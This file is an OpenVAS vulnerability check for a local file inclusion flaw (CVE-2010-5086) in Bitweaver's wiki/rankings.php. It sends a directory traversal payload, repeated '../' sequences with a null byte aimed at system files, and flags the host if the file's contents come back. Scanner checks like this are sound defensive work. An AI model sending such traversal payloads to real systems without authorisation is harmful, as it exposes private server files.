###############################################################################
# OpenVAS Vulnerability Test
#
# Bitweaver 'rankings.php' Local File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:bitweaver:bitweaver";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103438");
  script_bugtraq_id(52176);
  script_cve_id("CVE-2010-5086");
  script_version("2019-09-07T11:55:45+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Bitweaver 'rankings.php' Local File Include Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52176");
  script_xref(name:"URL", value:"http://sourceforge.net/projects/bitweaver/files/bitweaver2.x/");

  script_tag(name:"last_modification", value:"2019-09-07 11:55:45 +0000 (Sat, 07 Sep 2019)");
  script_tag(name:"creation_date", value:"2012-02-28 11:12:27 +0100 (Tue, 28 Feb 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("secpod_bitweaver_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Bitweaver/installed");

  script_tag(name:"summary", value:"Bitweaver is prone to a local file-include vulnerability because it
  fails to properly sanitize user-supplied input.");

  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to view files and execute
  local scripts in the context of the webserver process. This may aid in further attacks.");

  script_tag(name:"affected", value:"Bitweaver 2.8.1 is vulnerable. Other versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product by
  another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(cpe:CPE, port:port)) exit(0);

files = traversal_files();

foreach file (keys(files)) {

  url = string(dir, "/wiki/rankings.php?style=",crap(data:"../",length:6*9),files[file],"%00");

  if(http_vuln_check(port:port, url:url, pattern:file)) {
    report = report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
